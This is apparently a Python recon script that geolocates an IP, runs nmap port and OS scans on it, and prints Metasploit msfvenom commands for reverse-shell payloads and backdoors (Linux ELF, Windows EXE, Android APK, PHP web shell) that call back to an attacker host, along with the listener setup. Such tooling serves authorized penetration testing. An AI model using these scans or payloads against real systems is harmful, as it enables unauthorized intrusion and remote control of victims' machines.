#!/usr/bin/env python3
# ============================================================
#  ipinfo - Network Recon Tool
#  Creator : flandreiii
#  License : MIT
#  Usage   : python3 ipinfo <IP> [--all | --ports | --os | --msf]
# ============================================================

import subprocess
import sys
import os
import json
import socket
import urllib.request
import shutil

# ─── ANSI colours ────────────────────────────────────────────
R  = "\033[1;31m"
G  = "\033[1;32m"
Y  = "\033[1;33m"
B  = "\033[1;34m"
M  = "\033[1;35m"
C  = "\033[1;36m"
W  = "\033[1;37m"
RE = "\033[0m"

BANNER = f"""
{R}  ██╗██████╗ ██╗███╗   ██╗███████╗ ██████╗
{R}  ██║██╔══██╗██║████╗  ██║██╔════╝██╔═══██╗
{R}  ██║██████╔╝██║██╔██╗ ██║█████╗  ██║   ██║
{R}  ██║██╔═══╝ ██║██║╚██╗██║██╔══╝  ██║   ██║
{R}  ██║██║     ██║██║ ╚████║██║     ╚██████╔╝
{R}  ╚═╝╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝
{Y}         Network Recon Tool
{C}         Creator: flandreiii
{W}  ─────────────────────────────────────────{RE}
"""

# ─── Helpers ─────────────────────────────────────────────────
def check_root():
    if os.geteuid() != 0:
        print(f"{Y}[!] Some scans (OS detection) require root. Run with sudo for full results.{RE}")

def require_nmap():
    if not shutil.which("nmap"):
        print(f"{R}[!] nmap not found. Install it:{RE}")
        print(f"    {C}pkg install nmap{RE}         # Termux")
        print(f"    {C}sudo pacman -S nmap{RE}      # CachyOS")
        print(f"    {C}sudo apt install nmap{RE}    # Kali")
        sys.exit(1)

def run(cmd: list[str]) -> str:
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "[!] Scan timed out."
    except FileNotFoundError as e:
        return f"[!] Command not found: {e}"

def separator(title=""):
    width = 45
    if title:
        pad = (width - len(title) - 2) // 2
        print(f"{B}{'─'*pad} {Y}{title}{B} {'─'*(width-pad-len(title)-2)}{RE}")
    else:
        print(f"{B}{'─'*width}{RE}")

# ─── Modules ─────────────────────────────────────────────────
def geo_info(ip: str):
    separator("IP / GEO INFO")
    try:
        # Resolve hostname
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except Exception:
            hostname = "N/A"

        url = f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,isp,org,as,query"
        with urllib.request.urlopen(url, timeout=10) as resp:
            data = json.loads(resp.read().decode())

        if data.get("status") == "success":
            fields = {
                "IP"        : data.get("query"),
                "Hostname"  : hostname,
                "Country"   : data.get("country"),
                "Region"    : data.get("regionName"),
                "City"      : data.get("city"),
                "ZIP"       : data.get("zip"),
                "ISP"       : data.get("isp"),
                "Org"       : data.get("org"),
                "AS"        : data.get("as"),
            }
            for k, v in fields.items():
                print(f"  {G}{k:<12}{RE}: {W}{v}{RE}")
        else:
            print(f"{R}  [!] ip-api error: {data.get('message')}{RE}")
    except Exception as e:
        print(f"{R}  [!] Could not fetch geo info: {e}{RE}")

def port_scan(ip: str):
    separator("PORT SCAN (top 1000)")
    require_nmap()
    print(f"{C}  [*] Running nmap -sV -T4 --open {ip} ...{RE}\n")
    output = run(["nmap", "-sV", "-T4", "--open", ip])
    # Pretty-print relevant lines
    for line in output.splitlines():
        if any(kw in line for kw in ["open", "filtered", "PORT", "service", "VERSION"]):
            print(f"  {W}{line}{RE}")
        elif line.startswith("Nmap scan") or line.startswith("Host is"):
            print(f"  {Y}{line}{RE}")

def os_scan(ip: str):
    separator("OS DETECTION")
    require_nmap()
    if os.geteuid() != 0:
        print(f"{R}  [!] OS detection requires root privileges.{RE}")
        print(f"  {Y}Tip: sudo python3 ipinfo {ip} --os{RE}")
        return
    print(f"{C}  [*] Running nmap -O -T4 {ip} ...{RE}\n")
    output = run(["nmap", "-O", "-T4", ip])
    for line in output.splitlines():
        if any(kw in line for kw in ["OS:", "OS details", "Running:", "CPE", "Aggressive"]):
            print(f"  {W}{line}{RE}")
        elif "open" in line:
            print(f"  {G}{line}{RE}")

def msf_examples(ip: str):
    separator("METASPLOIT PAYLOAD EXAMPLES")
    print(f"""
{Y}  ⚠  These examples are for AUTHORIZED penetration testing only.
  Never use against systems you don't own or have written permission
  to test. Unauthorized access is illegal.{RE}

{C}  ── Reverse TCP Shell (Linux) ──────────────────────────────{RE}
  {G}msfvenom -p linux/x86/meterpreter/reverse_tcp \\
      LHOST=<YOUR_IP> LPORT=4444 -f elf > shell.elf{RE}

  {C}Listener:{RE}
  {G}msf6 > use exploit/multi/handler
  msf6 > set PAYLOAD linux/x86/meterpreter/reverse_tcp
  msf6 > set LHOST <YOUR_IP>
  msf6 > set LPORT 4444
  msf6 > run{RE}

{C}  ── Reverse TCP Shell (Windows) ────────────────────────────{RE}
  {G}msfvenom -p windows/x64/meterpreter/reverse_tcp \\
      LHOST=<YOUR_IP> LPORT=4444 -f exe > shell.exe{RE}

{C}  ── Reverse Shell (Android APK) ────────────────────────────{RE}
  {G}msfvenom -p android/meterpreter/reverse_tcp \\
      LHOST=<YOUR_IP> LPORT=4444 R > backdoor.apk{RE}

{C}  ── Web Shell (PHP) ────────────────────────────────────────{RE}
  {G}msfvenom -p php/meterpreter_reverse_tcp \\
      LHOST=<YOUR_IP> LPORT=4444 -f raw > shell.php{RE}

{Y}  Target IP reference: {W}{ip}{RE}
{Y}  Replace <YOUR_IP> with your attacker machine's IP.{RE}
""")

# ─── Interactive Menu ─────────────────────────────────────────
def interactive_menu(ip: str):
    while True:
        separator("MENU")
        print(f"  {G}[1]{RE} IP / Geo Location Info")
        print(f"  {G}[2]{RE} Port Scan")
        print(f"  {G}[3]{RE} OS Detection")
        print(f"  {G}[4]{RE} Metasploit Payload Examples")
        print(f"  {G}[5]{RE} Run All")
        print(f"  {R}[0]{RE} Exit")
        separator()
        choice = input(f"\n  {C}ipinfo > {RE}").strip()

        if choice == "1":
            geo_info(ip)
        elif choice == "2":
            port_scan(ip)
        elif choice == "3":
            os_scan(ip)
        elif choice == "4":
            msf_examples(ip)
        elif choice == "5":
            geo_info(ip)
            port_scan(ip)
            os_scan(ip)
            msf_examples(ip)
        elif choice == "0":
            print(f"\n{Y}  [*] Goodbye, flandreiii o7{RE}\n")
            sys.exit(0)
        else:
            print(f"{R}  [!] Invalid option.{RE}")
        print()

# ─── CLI flags ────────────────────────────────────────────────
def cli_mode(ip: str, flag: str):
    fmap = {
        "--ports" : port_scan,
        "--os"    : os_scan,
        "--msf"   : msf_examples,
        "--geo"   : geo_info,
    }
    if flag == "--all":
        geo_info(ip); port_scan(ip); os_scan(ip); msf_examples(ip)
    elif flag in fmap:
        fmap[flag](ip)
    else:
        print(f"{R}Unknown flag: {flag}{RE}")
        usage()

def usage():
    print(f"""
{W}Usage:{RE}
  {G}python3 ipinfo <IP>{RE}                  Interactive menu
  {G}python3 ipinfo <IP> --all{RE}            Run everything
  {G}python3 ipinfo <IP> --geo{RE}            Geo/IP info only
  {G}python3 ipinfo <IP> --ports{RE}          Port scan only
  {G}python3 ipinfo <IP> --os{RE}             OS detection only
  {G}python3 ipinfo <IP> --msf{RE}            Metasploit examples only
""")
    sys.exit(0)

# ─── Entry point ─────────────────────────────────────────────
def main():
    print(BANNER)
    check_root()

    if len(sys.argv) < 2:
        usage()

    ip = sys.argv[1]
    if ip in ("-h", "--help"):
        usage()

    # Basic IP/hostname validation
    try:
        resolved = socket.gethostbyname(ip)
        if resolved != ip:
            print(f"  {Y}[*] Resolved {ip} → {resolved}{RE}")
            ip = resolved
    except socket.gaierror:
        print(f"{R}[!] Could not resolve host: {ip}{RE}")
        sys.exit(1)

    if len(sys.argv) == 3:
        cli_mode(ip, sys.argv[2])
    else:
        interactive_menu(ip)

if __name__ == "__main__":
    main()
